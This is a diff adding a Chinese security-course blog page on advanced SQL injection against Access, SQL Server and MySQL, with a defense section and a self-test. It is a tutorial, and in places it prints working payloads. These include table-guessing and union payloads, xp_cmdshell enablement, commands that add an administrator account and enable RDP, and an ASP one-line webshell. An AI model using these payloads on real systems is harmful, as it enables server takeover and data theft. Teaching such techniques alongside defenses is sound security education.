@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>46 · SQL注入进阶 | tongui 的安全笔记</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SQL 注入进阶 ⭐ 一句话总结:不同数据库的注入大同小异,差别在”特性”——Access 靠暴力猜表,SQL Server 靠 SA&#x2F;DBO 权限执行系统命令,MySQL 5.0+ 靠 information_schema;防护的核心是”不拼接、参数化、限权限”。  学习目标 掌握 Access 数据库注入方式 掌握 SQL Server 三大权限的利用 理解 MySQL 5.0 上下">
+<meta property="og:type" content="website">
+<meta property="og:title" content="46 · SQL注入进阶">
+<meta property="og:url" content="https://tongui66.github.io/course-notes/chapter2-web-vulns/46-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/index.html">
+<meta property="og:site_name" content="tongui 的安全笔记">
+<meta property="og:description" content="SQL 注入进阶 ⭐ 一句话总结:不同数据库的注入大同小异,差别在”特性”——Access 靠暴力猜表,SQL Server 靠 SA&#x2F;DBO 权限执行系统命令,MySQL 5.0+ 靠 information_schema;防护的核心是”不拼接、参数化、限权限”。  学习目标 掌握 Access 数据库注入方式 掌握 SQL Server 三大权限的利用 理解 MySQL 5.0 上下">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-08T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-08T01:54:51.761Z">
+<meta property="article:author" content="tongui">
+<meta property="article:tag" content="Web安全, 渗透测试, CTF, SQL注入, XSS, 内网渗透, 应急响应, 安全笔记">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="tongui 的安全笔记" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a href="/" id="logo" class="nav-logo">tongui 的安全笔记</a>
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/course-notes/">课程</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+        
+          <a class="main-nav-link" href="/tools">工具</a>
+        
+          <a class="main-nav-link" href="/projects">项目</a>
+        
+          <a class="main-nav-link nav-resume" href="/resume">简历</a>
+        
+          <a class="main-nav-link" href="/about">关于我</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/tongui66"><span class="fa fa-github"></span></a>
+          
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tongui66.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="page-" class="h-entry article article-type-page" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/course-notes/chapter2-web-vulns/46-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/index.html" class="article-date">
+  <time class="dt-published" datetime="2026-08-08T02:00:00.000Z" itemprop="datePublished">2026-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      46 · SQL注入进阶
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL-注入进阶"><a href="#SQL-注入进阶" class="headerlink" title="SQL 注入进阶"></a>SQL 注入进阶</h1><blockquote>
+<p>⭐ <strong>一句话总结</strong>:不同数据库的注入大同小异,差别在”特性”——Access 靠暴力猜表,SQL Server 靠 SA&#x2F;DBO 权限执行系统命令,MySQL 5.0+ 靠 information_schema;防护的核心是”不拼接、参数化、限权限”。</p>
+</blockquote>
+<h2 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h2><ul>
+<li>掌握 Access 数据库注入方式</li>
+<li>掌握 SQL Server 三大权限的利用</li>
+<li>理解 MySQL 5.0 上下版本和 MySQL8 的注入区别</li>
+<li>掌握 SQL 注入通用防护手段</li>
+</ul>
+<h2 id="一、Access-数据库注入"><a href="#一、Access-数据库注入" class="headerlink" title="一、Access 数据库注入"></a>一、Access 数据库注入</h2><ul>
+<li>特点:微软文档型数据库,一个 <code>.mdb/.accdb</code> 文件 &#x3D; 一个库;没有库的概念,没有 information_schema。</li>
+<li>危害:如果通过目录扫描找到数据库文件路径,直接下载整个库。</li>
+<li>注入流程:<ol>
+<li>加单引号测注入点(报错即存在)。</li>
+<li>用 <code>exists(select * from 表名)</code> 猜表名:报错&#x3D;表不存在,不报错&#x3D;表存在。</li>
+<li>猜出表后猜列名(常见 admin、username、password),再 <code>union select 1,2,3</code> 找展示位,把列名填进去取数据。</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 猜表</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news) #</span><br><span class="line"><span class="comment">-- 猜列并取数据</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password <span class="keyword">from</span> admin #</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>工具:穿山甲(Pangolin)、萝卜头,自动用内置字典猜表列。</li>
+</ul>
+<h2 id="二、SQL-Server-MSSQL-注入基础"><a href="#二、SQL-Server-MSSQL-注入基础" class="headerlink" title="二、SQL Server(MSSQL)注入基础"></a>二、SQL Server(MSSQL)注入基础</h2><ul>
+<li>默认端口 <strong>1433</strong>(Oracle 1521、MySQL 3306)。</li>
+<li>通用测试:<code>&#39;</code> 报错、<code>and 1=1 / and 1=2</code>、<code>order by N</code> 判断列数(和 MySQL 不同,order by 后面是数字不是逗号列表)。</li>
+<li>联合查询时<strong>数据类型要求严格</strong>:字符串列放数字会报”类型转换失败”,把报错当回显用。</li>
+<li>系统信息函数:<code>DB_NAME()</code> 库名、<code>@@VERSION</code> 版本、<code>USER_NAME()</code> 用户、<code>HOST_NAME()</code> 主机名。</li>
+<li>取前 N 行用 <code>select top 1 ...</code>;跨库写法 <code>库名..表名</code>(如 master..sysobjects)。</li>
+<li>系统库 master 类似 MySQL 的 information_schema。</li>
+</ul>
+<h2 id="三、SQL-Server-三大权限-重点"><a href="#三、SQL-Server-三大权限-重点" class="headerlink" title="三、SQL Server 三大权限(重点)"></a>三、SQL Server 三大权限(重点)</h2><table>
+<thead>
+<tr>
+<th>权限</th>
+<th>能力</th>
+<th>利用重点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SA(sysadmin)</td>
+<td>最高,可操作所有库</td>
+<td>开启&#x2F;使用 xp_cmdshell 执行系统命令</td>
+</tr>
+<tr>
+<td>DB owner</td>
+<td>只控制某个数据库</td>
+<td>写一句话木马、备份数据库成木马文件</td>
+</tr>
+<tr>
+<td>public</td>
+<td>最低,只能查询</td>
+<td>只能脱库,拿不到 shell</td>
+</tr>
+</tbody></table>
+<h3 id="SA-权限注入"><a href="#SA-权限注入" class="headerlink" title="SA 权限注入"></a>SA 权限注入</h3><ol>
+<li>判断权限:</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>))  <span class="comment">-- 1=有 SA,0=没有</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>判断&#x2F;开启 xp_cmdshell:</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>           <span class="comment">-- 能执行=已开启</span></span><br><span class="line">;<span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;reconfigure;   <span class="comment">-- 开启扩展配置</span></span><br><span class="line">;<span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;reconfigure;            <span class="comment">-- 开启命令执行</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>利用命令拿下系统:</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user jadon <span class="number">123456</span> /add                 -- 添加系统用户</span><br><span class="line"><span class="built_in">net</span> localgroup administrators jadon /add   -- 加入管理员组</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f  -- 开 <span class="number">3389</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>然后用创建的账号远程桌面(RDP 3389)直接登录目标机。</li>
+</ol>
+<blockquote>
+<p>⭐ 重点:SA 权限 + 注入 &#x3D; 直接控制操作系统,危害极大。</p>
+</blockquote>
+<h3 id="DB-owner-权限注入"><a href="#DB-owner-权限注入" class="headerlink" title="DB owner 权限注入"></a>DB owner 权限注入</h3><ul>
+<li>判断:<code>and 1=(select is_member(&#39;db_owner&#39;))</code>。</li>
+<li>拿 shell 方式一:xp_cmdshell 写一句话木马(需要先拿到站点真实物理路径)。</li>
+<li>拿物理路径:把 <code>dir /s /b c:\目标文件</code> 的执行结果 insert 进自建表,再通过报错注入读出来。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">create table</span> black(a <span class="type">int</span>,b <span class="type">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">;<span class="keyword">insert into</span> black <span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;dir /s /b c:\1.aspx&#x27;</span>;</span><br><span class="line"><span class="comment">-- 再用报错注入读出路径</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &#x27;<span class="built_in">echo</span> ^&lt;%execute request(&quot;jadon&quot;)^%&gt; &gt; c:\web\muma.asp&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>拿 shell 方式二:把包含一句话木马的数据库备份成 <code>.asp/.aspx</code> 文件放到站点目录,再用菜刀&#x2F;蚁剑连接。</li>
+<li>连接工具:菜刀(老)、蚁剑、冰蝎、哥斯拉;连上后权限 &#x3D; Web 服务进程权限(如 IIS 的 IUSR),通常较低。</li>
+</ul>
+<h3 id="public-权限"><a href="#public-权限" class="headerlink" title="public 权限"></a>public 权限</h3><ul>
+<li>只能查数据:不断用报错&#x2F;布尔方式提取库名(DB_NAME()&#x2F;序号)、表名、列名、数据,即”脱库”。</li>
+<li>手工太慢可用穿山甲等工具;拿不到 WebShell。</li>
+</ul>
+<h2 id="四、MySQL-版本区别-面试题"><a href="#四、MySQL-版本区别-面试题" class="headerlink" title="四、MySQL 版本区别(面试题)"></a>四、MySQL 版本区别(面试题)</h2><ul>
+<li><strong>5.0 及以上</strong>:自带 <code>information_schema</code> 库,直接查库&#x2F;表&#x2F;列。</li>
+<li><strong>5.0 以下</strong>:没有该库,只能像 Access 一样暴力猜解。</li>
+<li>必记三张表:</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>表</th>
+<th>关键字段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>schemata</td>
+<td>schema_name(库名)</td>
+</tr>
+<tr>
+<td>tables</td>
+<td>table_name(表名)、table_schema(库名)</td>
+</tr>
+<tr>
+<td>columns</td>
+<td>column_name(列名)、table_name、table_schema</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>MySQL 8</strong> 与 5 的区别:<ul>
+<li>创建用户和授权必须分两步(<code>create user</code> 后再 <code>grant</code>)。</li>
+<li>新增 <code>table users</code>(等价 select * from users)和 <code>values row(1,2,3)</code>(可替代部分 union select 场景)函数。</li>
+</ul>
+</li>
+</ul>
+<h2 id="五、SQL-注入防护-报告必备"><a href="#五、SQL-注入防护-报告必备" class="headerlink" title="五、SQL 注入防护(报告必备)"></a>五、SQL 注入防护(报告必备)</h2><ol>
+<li><strong>类型判断</strong>:ID 参数必须是数字(is_numeric),非数字直接拒绝。</li>
+<li><strong>特殊字符转义</strong>:addslashes、mysql_real_escape_string,给引号加反斜杠。</li>
+<li><strong>正则过滤</strong>:禁止 union&#x2F;and&#x2F;or&#x2F;select 等关键字。</li>
+<li><strong>参数化查询(重点)</strong>:预处理 prepare + 参数绑定 bindParam,输入只当”值”不当 SQL 语句。</li>
+<li><strong>白名单过滤</strong>:动态表名&#x2F;列名场景,只允许指定名称。</li>
+<li><strong>最小权限</strong>:网站连接数据库别用 root&#x2F;SA,只授权所需库表的最小权限。</li>
+<li><strong>敏感数据加密</strong>:密码等用哈希(加盐)存储。</li>
+<li><strong>关闭错误显示</strong>:生产环境不向用户输出数据库报错信息。</li>
+</ol>
+<blockquote>
+<p>⭐ 重点:防护总原则 &#x3D; 永远不信任用户输入、永远不动态拼接 SQL、永远不用高权限连接数据库。</p>
+</blockquote>
+<h2 id="六、重点速记"><a href="#六、重点速记" class="headerlink" title="六、重点速记"></a>六、重点速记</h2><ul>
+<li>Access:文件型数据库,exists 猜表 + union 取数,找到文件直接下载</li>
+<li>MSSQL:1433 端口;order by 判断列数;类型转换报错&#x3D;报错注入</li>
+<li>SA→xp_cmdshell 建用户&#x2F;开 3389;DBO→写马&#x2F;备份拿 shell;public→只能脱库</li>
+<li>MySQL:5.0+ 用 information_schema(schemata&#x2F;tables&#x2F;columns);8 分步授权+table&#x2F;values</li>
+<li>防护:类型判断、转义、参数化查询、白名单、最小权限、加密、关报错</li>
+</ul>
+<h2 id="自测题"><a href="#自测题" class="headerlink" title="自测题"></a>自测题</h2><ol>
+<li>Access 数据库和 MySQL 注入最大的区别是什么?</li>
+<li>SQL Server 默认端口是多少?</li>
+<li>判断列数为什么用 order by?</li>
+<li>SA 权限能做什么?</li>
+<li>xp_cmdshell 是干什么的?</li>
+<li>DB owner 拿 shell 有哪两种方式?</li>
+<li>MySQL 5.0 和 5.0 以下注入区别?</li>
+<li>参数化查询为什么能防注入?</li>
+<li>网站连接数据库为什么要用最小权限?</li>
+<li>生产环境为什么要关闭错误显示?</li>
+</ol>
+<details><summary>参考答案</summary>
+1. Access 没有 information_schema,只能暴力猜表名列名,找到库文件还能直接下载。<br>
+2. 1433。<br>
+3. order by N 大于列数时报错,以此确定列数,方便 union select。<br>
+4. 通过 xp_cmdshell 执行系统命令,添加用户、开远程桌面、控制整台服务器。<br>
+5. SQL Server 的存储过程,可执行操作系统命令。<br>
+6. xp_cmdshell 写一句话木马;把含木马的数据库备份成 asp/aspx 文件。<br>
+7. 5.0+ 有 information_schema 可直接查结构,5.0- 只能暴力猜。<br>
+8. 预处理+参数绑定把输入当值处理,不会被拼成 SQL 语句执行。<br>
+9. 即使被注入或配置泄露,攻击者能操作的数据也有限。<br>
+10. 防止报错信息泄露数据库类型、表名、路径等敏感信息。<br>
+</details>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tongui66.github.io/course-notes/chapter2-web-vulns/46-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/index.html" data-id="cuidFyvzhhuHVP6j2ogfUnAzH" data-title="46 · SQL注入进阶" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/security-notes/interview-100/">面试高频问答 100 题</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/incident-response/">应急响应速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+          </li>
+        
+          <li>
+            <a href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 tongui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/security-notes/" class="mobile-nav-link">安全笔记</a>
+  
+    <a href="/course-notes/" class="mobile-nav-link">课程</a>
+  
+    <a href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95" class="mobile-nav-link">CTF题解</a>
+  
+    <a href="/tools" class="mobile-nav-link">工具</a>
+  
+    <a href="/projects" class="mobile-nav-link">项目</a>
+  
+    <a href="/resume" class="mobile-nav-link">简历</a>
+  
+    <a href="/about" class="mobile-nav-link">关于我</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script>
+  (function(){
+    var path = location.pathname.replace(/\/+$/, '') || '/';
+    var links = document.querySelectorAll('#main-nav .main-nav-link');
+    var best = null, bestLen = -1;
+    for (var i = 0; i < links.length; i++){
+      var href = links[i].getAttribute('href') || '';
+      href = href.replace(/\/+$/, '') || '/';
+      var hit = (href === '/' ? path === '/' : (path === href || path.indexOf(href + '/') === 0));
+      if (hit && href.length > bestLen){
+        bestLen = href.length;
+        best = links[i];
+      }
+    }
+    if (best){
+      best.classList.add('current');
+    }
+  })();
+</script>
+
+
+
+
+
+
+  </div>
+</body>
+</html>
